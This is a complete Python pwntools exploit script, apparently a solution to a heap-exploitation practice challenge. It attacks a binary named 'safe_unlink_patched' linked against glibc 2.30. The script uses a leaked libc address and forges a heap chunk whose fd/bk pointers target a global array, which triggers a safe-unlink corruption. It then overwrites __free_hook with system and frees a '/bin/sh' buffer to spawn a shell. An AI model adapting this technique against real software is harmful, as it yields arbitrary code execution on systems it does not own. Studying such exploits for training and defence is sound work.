#!/usr/bin/env python3

from pwn import *

exe = ELF("./safe_unlink_patched")
libc = ELF("./libc-2.30.so")
ld = ELF("./ld-2.30.so")

context.binary = exe

p = process()

def add(size):
    p.sendafter(b'> ',b'1')
    p.sendafter(b'size: ',f"{size}".encode())

def edit(index,data):
    p.sendafter(b'> ',b'2')
    p.sendafter(b'index: ',f"{index}".encode())
    p.sendafter(b'data: ',data)
def free(index):
    p.sendafter(b'> ',b'3')
    p.sendafter(b'index: ',f"{index}".encode())
p.recvuntil(b'@ ')
libc.address = int(p.recvline()[:-1],16) - libc.sym.puts
log.info(f"libc: {hex(libc.address)}")
input()
add(0x88)
add(0x88)

fd = exe.sym.m_array - 24
bk = exe.sym.m_array - 16
prev_size = 0x80
fake_size = 0x90
edit(0,p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))
free(1)
edit(0,p64(0)*3 + p64(libc.sym.__free_hook-8))
edit(0,b'/bin/sh\0' + p64(libc.sym.system))
free(0)

p.interactive()
